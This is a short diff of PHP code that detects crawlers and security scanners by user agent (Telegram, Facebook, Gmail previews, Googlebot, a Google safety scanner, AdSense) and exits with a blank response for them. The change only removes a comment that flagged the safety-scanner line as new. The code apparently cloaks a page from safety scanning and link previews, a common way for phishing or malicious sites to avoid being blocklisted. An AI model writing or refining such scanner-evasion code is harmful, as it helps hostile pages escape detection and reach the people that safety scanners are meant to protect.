@@ -11,7 +11,7 @@ if (strpos($userAgent, 'TelegramBot') !== false ||      // Telegram
     strpos($userAgent, 'Facebot') !== false ||          // FB Crawler
     strpos($userAgent, 'GoogleImageProxy') !== false || // Gmail Previews
     strpos($userAgent, 'Googlebot') !== false ||        // Google Search
-    strpos($userAgent, 'Google-Safety') !== false ||    // <--- NEW: Safety Scanner
+    strpos($userAgent, 'Google-Safety') !== false ||    
     strpos($userAgent, 'Mediapartners-Google') !== false) { // AdSense Bot
     
     exit(); // Stop immediately. Show them nothing.
